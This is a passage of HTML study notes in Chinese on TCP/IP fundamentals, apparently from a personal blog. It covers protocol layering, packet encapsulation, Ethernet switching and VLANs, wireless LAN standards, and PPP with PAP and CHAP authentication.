alt="路由器/3层交换机"></p><p>基于IP地址进行数据转发，先通过学习IP地址来建立转发表，然后根据数据包的源和目的IP地址进行路由判断，从而实现数据的快速转发和路由。</p><p><strong>4~7层交换机</strong></p><p>4~7层交换机负责处理OSI模型中从传输层到应用层的数据</p><p><strong>网关</strong></p><p>用于连接两个不同的网络，使得可以互相通信，网关通常是一台计算机或路由器，它可以将一个网络的数据包转发到另一个网络中，实现不同网络之间的数据交换和通信。</p><p>作用：</p><p>（1）实现不同协议之间的转换：将一个协议的数据包转换成另一个协议的数据包，从而实现不同协议之间的通信</p><p>（2）实现不同网络之间的连接：连接两个不同的网络成为一个更大的网络</p><p>（3）提供安全功能：网关可以对数据包进行过滤和检查，以提高网络的安全性。例如，网关可以对数据包的源地址和目的地址进行检查，防止未经授权的访问。</p><p>（4）提供路由功能：网关可以根据不同的路由协议对数据包进行路由，从而实现不同网络之间的数据转发和通信</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230329191802486.png" alt="网关"></p><h2 id="第二章-TCP-IP基础知识"><a href="#第二章-TCP-IP基础知识" class="headerlink" title="第二章 TCP/IP基础知识"></a>第二章 TCP/IP基础知识</h2><p>互联网进行通信的时候，需要相应的网络协议，TCP/IP原本就是为使用互联网而开发制定的协议族，因此，互联网的协议就是TCP/IP</p><p>互联网中的每个网络都是由骨干网和末端网组成的，每个网络之间通过NOC相连，如果网络的运行商不同，他的网络连接方式和使用方法也会不同。连接这种异构网络需要<strong>IX</strong>的支持。</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230330204725100.png" alt="互联网的结构"></p><h3 id="2-1-分层"><a href="#2-1-分层" class="headerlink" title="2.1 分层"></a>2.1 分层</h3><p><strong>TCP/IP协议分层模型</strong></p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230330205028567.png" alt="TCP/IP协议分层模型"></p><p><strong>硬件（物理层）：</strong>这种硬件就相当于以太网或电话线路等物理层的设备。</p><p><strong>网络接口层（数据链路层）：</strong>网络接口层利用以太网中的数据链路进行通信，属于接口层，可以看做是让NIC起作用的”驱动程序“。</p><p><strong>互联网层（网络层）：</strong>互联网层使用IP协议，它相当于OSI模型中的第3层网络层，IP协议基于IP地址转发分包数据。</p><p><strong>IP：</strong>是跨越网络传送数据包，使整个互联网都能收到数据的协议。IP协议使数据能够发送到地球的另一端，使用IP地址作为主机的标识。</p><p><strong>ICMP：</strong>IP数据包在发送途中一旦发生异常导致无法到达对端目标地址时，需要给发送端发送一个发生异常的通知。</p><p><strong>ARP：</strong>从分组数据包的IP地址中解析出物理地址(MAC地址)的一种协议</p><p><strong>传输层：</strong>让应用程序之间实现通信，而计算机内部通常同一时间运行着多个程序，为了分清哪些程序与哪些程序在进行通信，识别这些应用程序的是端口号</p><p><strong>TCP：</strong>面向连接的传输层协议，保证两端通信主机之间的通信可达。它可以正确处理在传输过程中丢包、传输顺序乱掉等异常情况，还可以有效利用带宽，缓解网络拥堵。<strong>但是</strong>为了建立与断开连接，需要至少7次的发包收包，导致网络流量的浪费，此外为了提高网络的利用率，TCP协议中定义了各种各样复杂的规范，因此不利于视频会议等场合使用。</p><p><strong>UDP：</strong>面向无连接的传输层协议，不会关注对端是否真的收到了传送过去的数据，如果需要检查对端是否收到分组数据包，或者对端是否连接到网络，则需要在应用程序中实现。</p><p><strong>应用层：</strong>TCP/IP应用的架构绝大多数属于客户端/服务端模型。提供服务的程序叫服务端，接收服务的程序叫客户端。</p><p><strong>WWW：</strong>浏览器与服务端之间通信所用的协议是HTTP，所传输数据的主要格式是HTML，WWW中的HTTP属于应用层协议，HTML属于表示层协议</p><p><strong>电子邮件：</strong>在网络上发送信件，不管距离，只要连着互联网就可以互相发送邮件。</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230330210810713.png" alt="电子邮件"></p><p><strong>FTP：</strong>文件传输是指将保存在其他计算机硬盘上的文件转移到本地的硬盘上，或将本地硬盘的文件传送到其他机器硬盘上的意思。</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230330210912928.png" alt="文件传输"></p><p><strong>远程登录（TELNET和SSH）：</strong>远程登录是指登录到远程的计算机上，使那台计算机上的程序得以运行的一种功能</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230330211119105.png" alt="远程登录"></p><p><strong>网络管理（SNMP）：</strong>在TCP/IP中进行网络管理时，采用SNMP协议，使用SNMP管理的主机、网桥、路由器等称作SNMP代理，而进行管理的那一段叫做管理器。</p><p>在SNMP的代理端，保存着网络接口的信息， 通信数据量，异常数据量以及设备温度等信息，这些信息可以通过MIB访问</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230330211327777.png" alt="网络管理"></p><h3 id="2-2-通信"><a href="#2-2-通信" class="headerlink" title="2.2 通信"></a>2.2 通信</h3><p><strong>数据包首部：</strong>每个分层中，都会对所发送的数据附加一个首部，这个首部包含了该层必要的信息，如发送的目标地址以及协议相关信息。</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230330211556300.png" alt="数据包首部"></p><p>包、帧、数据报、段、消息都用来表述数据的单位，帧用于数据链路层中包的单位，数据报是网络侧以上的分层中包的单位，段是表示TCP数据流中的信息，消息是应用协议中数据的单位。</p><p>数据包的首部，明确标明了协议应该如何读取数据</p><p><strong>以甲要给乙发送电子邮件，来讲解TCP/IP通信的过程。</strong></p><p><strong>（1）应用程序处理：</strong>应用程序进行编码处理，发送邮件的那一刻建立TCP连接，利用这个TCP连接发送数据。它的过程首先是将应用的数据发送给下一层的TCP，在做实际的转发处理</p><p><strong>（2）TCP模块的处理：</strong>TCP根据应用的指示，负责建立连接、发送数据以及断开连接。TCP提供将应用层发来的数据顺利发送到对端的可靠传输。</p><p>它会在应用层数据的前端附加一个TCP首部，TCP首部中包括源端口号和目标端口号(用以识别发送主机跟接收主机上的应用)、序号（用以发送的包中哪部分是数据）以及校验和（用以判断数据是否被损坏），然后将附加了TCP首部的包再发送给IP</p><p><strong>（3）IP模块的处理：</strong>IP将传过来的数据包，添加IP首部，包含接收端IP地址以及发送端IP地址，紧随IP首部的还有用来判断后面数据是TCP还是UDP的信息。IP包生成后，参考路由控制表决定此IP包的路由或主机，随后IP包将被发送给连接这些路由器或主机网络接口的驱动程序，以实现真正发送数据。如果不知道接收端的MAC地址，可以利用ARP查找，只要知道了对端的MAC地址，就可以将MAC地址和IP地址交给以太网的驱动程序，实现数据传输。</p><p><strong>（4）网络接口（以太网驱动）的处理：</strong>给数据包附加上以太网首部并进行发送处理，以太网首部中包含接收端MAC地址、发送端MAC地址以及标志以太网类型的以太网数据的协议。根据上述信息产生的以太网数据包将通过物理层传输给接收端，发送处理中的FCS由硬件计算，添加到包的最后。设置FCS的目的是为了判断数据包是否由于噪声而被破坏。</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230330213136726.png" alt="发邮件通信过程"></p><p><strong>经过数据链路的包：</strong>包流动的时候，从前往后一次被附加了以太网包首部，IP包首部，TCP包首部以及应用自己的包首部和数据，而包的最后则追加了以太网包尾。</p><p>每个包首部中至少都有两个信息：一个是发送端和接收端地址，另一个是上一层的协议类型</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230330213517198.png" alt="包结构"></p><p><strong>数据包接收处理：</strong>包的接收流程是发送流程的逆序过程。</p><p><strong>网络接口（以太网驱动）的处理：</strong>主机收到以太网包以后，首先从以太网的包的首部找到MAC地址判断是否为发给自己的包，如果不是发给自己的包则丢弃数据。而如果接收到了恰好是发给自己的包，就查找以太网包首部中的类型域从而确定以太网协议所传送过来的数据类型。这个类中中数据类型是IP包，因此将数据传送给处理IP的子程序，如果这时不是IP而是其他诸如ARP的协议，就把数据传给ARP处理,如果类型无法识别就丢弃。</p><p><strong>IP模块的处理：</strong>IP模块收到IP包首部及后面的数据部分以后，也做类似的处理，如果判断得出包首部中的IP地址与自己的IP地址匹配，则可接收数据并从中查找上一层的协议，传给相应的模块处理。</p><p><strong>TCP模块的处理：</strong>在TCP模块中，首先会计算一下校验和，判断数据是否被破坏，然后检查是否在按照序号接收数据，最后检查端口号，确定具体的应用程序。数据接收完毕后，接收端发送“确认回执”给发送端，如果这个回执信息未能达到发送端，那么发送端就会认为接收端没有接收到数据而一直反复发送。数据被完整地接收以后，会传给由端口识别的应用程序。</p><p><strong>应用程序的处理：</strong>接收端应用程序会直接接收发送端发送的数据。通过解析数据可以获取邮件的收件人地址是乙的地址，如果主机B上没有乙的邮件信箱，那么主机B返回给发送一个“无此收件地址”的报错信息。</p><h2 id="第三章-数据链路"><a href="#第三章-数据链路" class="headerlink" title="第三章 数据链路"></a>第三章 数据链路</h2><p>数据链路，指OSI参考模型中的数据链路层，有时也指以太网、无线局域网等通信手段。</p><p>数据链路层的协议定义了通过通信媒介互连的设备之间传输的规范，通信媒介包括双绞线电缆，同轴电缆，光纤，电波以及红外线等介质。此外，各个设备之间有时也会通过交换机、网桥、中继器等中转数据。</p><p><strong>MAC地址：</strong>MAC地址用于识别数据链路中互连的结点。</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230331170749749.png" alt="MAC地址"></p><p><strong>MAC地址长48比特</strong></p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230331170924346.png" alt="MAC地址"></p><h3 id="3-1-传输"><a href="#3-1-传输" class="headerlink" title="3.1 传输"></a>3.1 传输</h3><h4 id="3-1-1-共享介质型网络"><a href="#3-1-1-共享介质型网络" class="headerlink" title="3.1.1 共享介质型网络"></a>3.1.1 <strong>共享介质型网络</strong></h4><p>从通信介质的使用方法上看，网络可以分为共享介质型和非共享介质型。共享介质型网络织由多个设备共享一个通信介质的一种网络。最早的以太网和FDDI就是介质共享型网络，这种方式下，设备之间使用同一个载波信道进行发送和接收，为此基本上采用半双工通信方式，并有必要对介质进行访问控制。共享介质型网络中有两种介质访问控制方式：一种是<strong>争用方式</strong>，另一种是<strong>令牌传递方式</strong>。</p><p><strong>争用方式：</strong>指争夺数据传输的权利，也加CSMA(载波监听多路访问)。这种方法通常令网络中的各个站采用先到先得的方式占用信道发送数据，如果多个站同时发送帧，则会产生冲突现象，导致网络拥堵和性能下降。</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230331172744540.png" alt="CSMA"></p><p>改良CSMA的另一种方式：<strong>CSMA/CD</strong>方式，它要求每一个站提前检查冲突，一旦发生冲突，则尽早释放信道。</p><p>工作原理：</p><p>（1）如果载波信道上没有数据流动，则任何站都可以发送数据。</p><p>（2）检查是否会发生冲突，一旦发生冲突，发起发送数据，同时立即释放载波信道</p><p>（3）放弃发送以后，随机延时一段时间，再重新争用介质，重新发送帧。</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230331172758635.png" alt="CSMA/CD"></p><p><strong>令牌传递方式：</strong>令牌传递方式是沿着令牌环发送一种叫做“令牌”的特殊报文，是控制传输的一种方式，只有获得令牌的站才能发送数据。</p><p><strong>特点：</strong>一是不会有冲突，二是每个站都有通过平等循环获得令牌的机会。但是一个站在没有收到令牌前不能发送数据帧， 因此在网络不太拥堵的情况下数据链路的利用率也就达不到100%。</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230331211409656.png" alt="令牌传递"></p><h4 id="3-1-2-非共享介质网络"><a href="#3-1-2-非共享介质网络" class="headerlink" title="3.1.2 非共享介质网络"></a>3.1.2 <strong>非共享介质网络</strong></h4><p>不共享介质，是对介质采取专用的一种传输控制方式。在这种方式下，网络中的每个站直连交换机，由交换机负责转发数据帧。不共享通信介质，通常采用全双工通信方式。在这种一对一连接全双工通信的方式下不会发生冲突，可以实现高效的通信。</p><p>但是如果交换机损坏，与之相连的所有计算机之间都将无法通信。</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230331211925563.png" alt="非共享介质网络"></p><h3 id="3-2-转发"><a href="#3-2-转发" class="headerlink" title="3.2 转发"></a>3.2 转发</h3><h4 id="3-2-1-根据MAC地址转发"><a href="#3-2-1-根据MAC地址转发" class="headerlink" title="3.2.1 根据MAC地址转发"></a>3.2.1 <strong>根据MAC地址转发</strong></h4><p>以太网交换机就是持有多个端口的网桥，它们根据数据链路层中的每个帧的目标MAC地址，决定从哪个网络接口发送数据，这张表叫做地址转发表。其内容不需要使用者在每个终端或交换机上手工设置，而是可以自动生成。</p><p>数据链路层的每个通过点在接收到包的时候，会从中将源MAC地址以及曾经接收该地址发送的数据包的接口作为对应关系记录到转发表中。以某个MAC地址作为源地址的包由某一接口接收，实质上可以理解为该MAC地址就是该接口的目标。</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230331213542976.png" alt="MAC地址转发"></p><p><strong>交换机的转发方式：</strong><code>存储转发</code>和<code>直通转发</code></p><p>存储转发方式检查以太网数据帧末尾的FCS(Frame Cheack Sequence)位再进行转发。因此，可以避免发送由于冲突而被破坏的帧或噪声导致的错误帧。</p><p>直通转发方式不需要完全接收就可以转发，具有演示较短的优势，但是同时也不可避免的发送错误帧的可能性。</p><h4 id="3-2-2-环路检测技术"><a href="#3-2-2-环路检测技术" class="headerlink" title="3.2.2 环路检测技术"></a>3.2.2 <strong>环路检测技术</strong></h4><p>通过网桥连接网络的时候，一旦出现环路该怎么处理？在计算机网络中，当两个或多个网桥（或交换机）通过多条路径连接时，可能会形成环路。这种情况下，数据包可能会在环路中不断地被转发，从而导致网络出现问题。 具体来说，当一个数据包到达一个环路中的交换机时，交换机会将该数据包向所有的连线端口进行广播。由于环路的存在，某些交换机会将该数据包再次广播到环路的另一个交换机上，这个交换机也会将该数据包再次广播，以此类推，数据包会在环路中不断地循环转发。这种情况下，网络中的带宽会被大量消耗，从而导致网络拥塞、延迟等问题。</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230331214929385.png" alt="环路"></p><p>所以必须要解决掉环路的这个问题。</p><p><strong>生成树方式</strong></p><p>每个网桥必须在每1~10秒内相互交换BPDU包，从而判断哪些端口使用哪些不适用，以便消除环路。一旦发生故障，则自动切换通信线路，利用那些没有被使用的端口继续进行传输。</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230331215449544.png" alt="生成树方式"></p><p>弊端在于发生故障切换网络的时候需要几十秒的时间，为了解决这个用时过长的问题，定义了一个叫RSTP的方法，这个方法可以将发生问题的时候恢复时间缩短到几秒内。</p><p><strong>源路由法</strong></p><p>它允许发送方指定数据包在传输过程中所经过的路由结点，在源路由协议中，每个数据包都携带有完整的路由信息，因此可以避免网络中的路由查找过程，提高了网络传输的效率。即使网桥中出现了环路，数据帧也不会反复转发，可成功地发送到目标地址。</p><h4 id="3-2-3-VLAN"><a href="#3-2-3-VLAN" class="headerlink" title="3.2.3 VLAN"></a>3.2.3 VLAN</h4><p>为什么要引入VLAN技术？在大型企业或组织中网络管理和数据传输的问题。在传统的网络结构中，所有设备都连接在同一个广播域内，这会造成很多问题，比如安全性问题，任何一个设备都可以轻易地嗅探到其他设备的数据流，从而造成数据泄露和安全问题。广播风暴问题：当一个设备向广播域内发送广播数据包的时候，所有设备都会接收到该数据包，从而导致网络拥堵和性能下降。网络管理非常困难，常常需要更改网络拓扑结构，所以我们需要引入VLAN技术。</p><p>VLAN：虚拟局域网，它将一个物理的广播域划分成多个逻辑上的广播域，使得不同的设备可以被分配到不同的VLAN中，实现更加精细的网络管理和控制。</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230331221220718.png" alt="VLAN"></p><p>如果是异构的两个网段之间，就需要利用具有路由功能的交换机(如3层交换机)，异构的两个网段的意思就是指代两个不同类型的网络，例如一个局域网和一个广域网、一个有线网络和一个无线网络。对于这种VLAN进行扩展，又定义了IEEE802.1Q的标准(TAG VLAN)，该标准允许包含跨越异构交换机的网段，TAG VLAN中对每个网段都用一个VLAN ID的标签进行唯一标识。在交换机中传输帧的时候，在以太网首部加入这个VID标签，根据这个值决定将数据帧发送给哪个网段。</p><p>使用了VLAN技术，不必再重新修改布线，只要修改网段即可。</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230331222443473.png" alt="VLAN"></p><h3 id="3-3-以太网"><a href="#3-3-以太网" class="headerlink" title="3.3 以太网"></a>3.3 以太网</h3><p>最为著名的，使用最为广泛的数据链路—以太网</p><p><strong>以太网分类</strong>：通信电缆的速度</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230331223320875.png" alt="以太网分类"></p><h4 id="以太网帧格式"><a href="#以太网帧格式" class="headerlink" title="以太网帧格式"></a>以太网帧格式</h4><p>以太网帧前端有一个叫做前导码的部分（8字节），由0,1数字交替组合而成。表示一个以太网帧的开始，也是对端网卡能够确保与其同步的标志</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230331225136063.png" alt="以太网帧前导码"></p><p>它可以根据同步码SDF进行同步，前导码的意义不仅仅在于同步，准确定位数据帧的开始位置，并在正确的时间开始接收数据，还可以区分与其他通信协议的冲突，前导码的长度和内容是固定的，因此如果使用其他通信协议的数据帧与以太网数据帧发生冲突时，接收方可以通过前导码来识别这个数据帧不是以太网数据帧，并将其丢弃。</p><p>以太网帧本体的前端是以太网的首部，共占14字节，分别是6个字节的目标MAC地址，6个字节的源MAC地址以及2个字节的上层协议类型</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230331225901750.png" alt="以太网帧结构"></p><p>可以根据Type/Length来区分两种帧的格式，如果Type/Length&gt;1500，则是以太网帧体格式；如果Type/Length&lt;1500，则是IEEE802.3以太网帧体格式</p><p>Type类型：IP（0x0800)、ARP(0x0806)、RARP(0x8035)、IPv6(0x86DD)</p><p>帧最后的FCS可以检查帧时候有所损坏。FCS保存着整个帧除以生成多项式的余数。</p><p>在VLAN中，帧的格式又会发生变化</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230331231025136.png" alt="VLAN中以太网帧格式"></p><p><strong>LLC和SNAP</strong></p><p>如果对数据链路层分为两层，可以分为介质访问控制层和逻辑链路控制层，介质访问控制层根据以太网或FDDI等不同数据链路所持有的首部信息进行控制，与之相比，逻辑链路层则根据以太网或FDDI等不同数据链路所共有的帧头信息进行控制。当类型字段的值为1500时，表示IEEE802.3以太网帧的长度，此时，即使参考类型对照表也无法确定上层协议的类型，所以就需要根据LLC/SNAP才能判断上层协议的类型。</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230331231646245.png" alt></p><h3 id="3-4-无线通信"><a href="#3-4-无线通信" class="headerlink" title="3.4 无线通信"></a>3.4 无线通信</h3><h4 id="3-4-1-无线通信的种类"><a href="#3-4-1-无线通信的种类" class="headerlink" title="3.4.1 无线通信的种类"></a>3.4.1 无线通信的种类</h4><p>根据通信距离进行分类</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230401101325216.png" alt="分类"></p><h4 id="3-4-2-IEEE802-11"><a href="#3-4-2-IEEE802-11" class="headerlink" title="3.4.2 IEEE802.11"></a>3.4.2 IEEE802.11</h4><p>IEEE802.11定义了无线LAN协议中物理层与数据链路层的一部分(MAC层)，MAC层中物理地址与以太网相同，都是用MAC地址，而介质访问上则使用CSAM/CD相似的CSAM/CA方式，通常采用无线基站并通过高基站实现通信。</p><p>IEEE802.11在物理层上使用<strong>电磁波或红外线</strong></p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230401101819535.png" alt></p><h4 id="3-4-3-IEEE802-11b和IEEE802-11g"><a href="#3-4-3-IEEE802-11b和IEEE802-11g" class="headerlink" title="3.4.3 IEEE802.11b和IEEE802.11g"></a>3.4.3 IEEE802.11b和IEEE802.11g</h4><p>IEEE802.11b和IEEE802.11g是2.4G频段中的无线局域网标准。最大传输速度可以达到11Mbps和54Mbps，通信距离可达30-50米，与IEEE802.11相似，在介质访问控制层中使用CSMA/CA方式，以基站作为中介进行通信。</p><p>CSMA/CA协议的原理如下：</p><ol><li>载波侦听：当一个终端需要发送数据时，首先要侦听信道上是否有其他终端正在传输数据。如果信道上没有其他终端在发送数据，则该终端可以开始发送数据；如果信道上有其他终端正在发送数据，则该终端需要等待一段时间再重复这个过程。</li><li>随机退避：如果两个终端同时开始发送数据，就会发生冲突。当发生冲突时，两个终端都会停止发送数据，并随机等待一段时间后再次尝试发送数据，以避免再次发生冲突。这个等待时间是随机的，并且每次发生冲突后都会加倍。</li><li>冲突避免：为了进一步减少冲突的发生，CSMA/CA协议引入了一种称为“RTS/CTS握手”的机制。在发送数据之前，发送端会先发送一个请求发送（RTS）帧给接收端，请求发送端口发送数据。接收端收到请求后，回复一个清除发送（CTS）帧，表示信道空闲，发送端可以开始发送数据。在这个过程中，其他终端都会保持沉默，避免对信道的干扰。</li><li>重传机制：如果数据在传输过程中发生错误，接收端会发送一个确认（ACK）帧，表示收到了正确的数据。如果发送端没有收到确认帧，则会认为数据发送失败，需要重新发送数据。</li></ol><h4 id="3-4-4-IEEE802-11a"><a href="#3-4-4-IEEE802-11a" class="headerlink" title="3.4.4 IEEE802.11a"></a>3.4.4 IEEE802.11a</h4><p>在物理层利用5GHz频段，最大传输速度可达54Mbps的一种无线通信标准，与IEEE802.11b/g存在一定的兼容性问题，但是市场上已经有支持这两方面的基站产品，再加上它不适用2.4GHz频段，因此也不易受干扰</p><h4 id="3-4-5-IEEE802-11n"><a href="#3-4-5-IEEE802-11n" class="headerlink" title="3.4.5 IEEE802.11n"></a>3.4.5 IEEE802.11n</h4><p>IEEEE802.11n实在IEEE802.11g和IEEE802.11a的基础上，采用同步多条天线的MIMO技术，实现高速无线通信的一种标准，在物理层使用2.4GHz或5GHz频段。在使用5GHz频段的情况下，如果不受其他2.4GHz频段系统的干扰，IEEE802.11n可以达到IEEE802.11a/b/g的几倍带宽（40MHz)，最大传输速度可以达到150Mps</p><h4 id="3-4-6-使用无线LAN时的注意事项"><a href="#3-4-6-使用无线LAN时的注意事项" class="headerlink" title="3.4.6 使用无线LAN时的注意事项"></a>3.4.6 使用无线LAN时的注意事项</h4><p>无线LAN允许使用者可以自由地移动位置、自由地放置设备，通过无线电波实现较广范围的通信，意味着在通信范围内，任何人都可以使用该无线LAN，因此会有被盗听或篡改的危险。</p><p>在无线LAN的标准中，为防止盗听或篡改，已定义可以对传输数据进行加密。</p><p>此外，无线LAN可以无需牌照使用特定频段，所以可能会受到其他通信设备的干扰，导致信号不稳定。</p><h4 id="3-4-7-蓝牙"><a href="#3-4-7-蓝牙" class="headerlink" title="3.4.7 蓝牙"></a>3.4.7 蓝牙</h4><p>蓝牙与IEEE802.11b/g类似，是使用2.4GHz频率无线电波的一种标准</p><h4 id="3-4-8-WIMAX"><a href="#3-4-8-WIMAX" class="headerlink" title="3.4.8 WIMAX"></a>3.4.8 WIMAX</h4><p>WiMAX是使用微波在企业或家庭使用无线通信的一种方式。它如DSL或FTTH一样，是实现无线网络关键步骤的一种方式。</p><h4 id="3-4-9-ZigBee"><a href="#3-4-9-ZigBee" class="headerlink" title="3.4.9 ZigBee"></a>3.4.9 ZigBee</h4><p>ZigBee主要应用于家电的远程控制，是一种短距离，低功耗的无线通信技术，它最多允许65536个终端之间互连通信。ZigBee的传输速度随着所使用的频率有所变化。</p><h3 id="3-5-PPP"><a href="#3-5-PPP" class="headerlink" title="3.5 PPP"></a>3.5 PPP</h3><h4 id="3-5-1-PPP定义"><a href="#3-5-1-PPP定义" class="headerlink" title="3.5.1 PPP定义"></a>3.5.1 PPP定义</h4><p>PPP是指点对点，即1对1连接计算机的协议。PPP相当于位于OSI参考模型第2层的数据链路层。</p><p>PPP是纯粹的数据链路层，与物理层没有任何关系。仅有PPP无法实现通信，还需要有物理层的支持。以太网是在物理层和数据链路层上运行的协议。</p><h4 id="3-5-2-LCP和NCP"><a href="#3-5-2-LCP和NCP" class="headerlink" title="3.5.2 LCP和NCP"></a>3.5.2 LCP和NCP</h4><p>在开始进行数据传输前，要先建立一个PPP级的连接，当这个连接建立以后就可以进行身份认证、压缩与加密。</p><p>在PPP的主要功能中包含两个协议：一个是不依赖上层的LCP协议，另一个是依赖上层的NCP协议，如果上层是IP，此时的NCP也叫做IPCP。</p><p>LCP(Link Control Protocol)主要负责建立和断开连接、设置最大接收单元(MRU,Maximum Receive Unit)、设置验证协议(PAP或CHAP)以及设置是否进行通信质量的监控。</p><p>IPCP（IP Control Protocol）负责IP地址设置以及是否进行TCP/IP首部压缩等设置</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230401110429595.png" alt="PPP"></p><p>通过PPP连接时，通常需要进行用户名密码的验证，并且对通信两端进行双方向的验证。其验证协议有两种，分别是PAP和CHAP</p><p>PAP是PPP连接建立时，需要两次握手进行用户名和密码验证。其中密码是明文方式传输，因此一般用户安全要求并不很高的环境，否则会有窃听或盗用连接的危险。</p><p>PAP（Password Authentication Protocol）是PPP协议族中的一种简单的认证协议，用于在PPP链路上进行用户身份验证。它的原理如下：首先被认证方向认证方发送认证请求（包含用户名和密码），以明文形式进行传输，认证方接到认证请求，再根据被认证方发送来的用户名去到自己的数据库认证用户名密码是否正确，如果密码正确，PAP认证通过，如果用户名密码错误，PAP认证未通过。</p><p>CHAP则使用一次性密码OTP，可以有效防止窃听。此外，在建立连接后还可以进行定期的密码交换，用来检验对端是否中途被替换。</p><p>CHAP原理：<br>在CHAP认证过程中，客户端需要使用自己的密码对服务端发送的挑战值进行计算，生成一个响应值。具体来说，计算的过程如下：</p><ol><li>客户端接收到服务端发送的挑战值后，将自己的密码和挑战值拼接在一起，使用一个哈希算法（如MD5）对拼接后的字符串进行摘要计算。</li><li>客户端将计算出的摘要作为响应值发送给服务端。</li><li>服务端接收到客户端发送的响应值后，按照同样的方式计算摘要，并与客户端发送的响应值进行比较。如果两者相同，则认为客户端的身份验证通过，否则认为验证失败。</li></ol><p>在CHAP认证过程中，客户端不是将自己的密码明文发送给服务端，而是将密码和挑战值进行结合，使用哈希算法计算出一个摘要后发送给服务端。这样做的好处在于，即使攻击者能够截获认证请求，也无法获取密码的明文，从而增加了认证的安全性。</p><h4 id="3-5-3-PPP的帧格式"><a href="#3-5-3-PPP的帧格式" class="headerlink" title="3.5.3 PPP的帧格式"></a>3.5.3 PPP的帧格式</h4><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230401132318029.png" alt="PPP的帧格式"></p><p>标志码用来区分每个帧，这一点与HDLC协议非常相似。</p><p>HDLC就是在每个帧的前后加上一个8位字节“01111110”用来区分帧。这一个8位字节叫做标志码，在这两个标志码中间不允许出现连续6个以上的“1“，因此在发送帧的时候，当出现连续5个”1“时后面必须插入一个0。而当接收端在接收帧的时候，如果收到连续的5个”1“且后面跟着的是0，就必须删除。由于最多只会出现5个连续的”1“，就可以比较容易地通过标志码区分帧的起始与终止。而PPP标准帧格式完全一致。</p><h4 id="3-5-4-PPPoE"><a href="#3-5-4-PPPoE" class="headerlink" title="3.5.4 PPPoE"></a>3.5.4 PPPoE</h4><p>单纯的以太网没有验证功能，也没有建立和断开连接的处理，因此无法按时计费，而如果采用PPPoE管理以太网连接，就可以利用PPP的验证等功能使各家ISP可以有效的管理终端用户的使用。</p><p><img 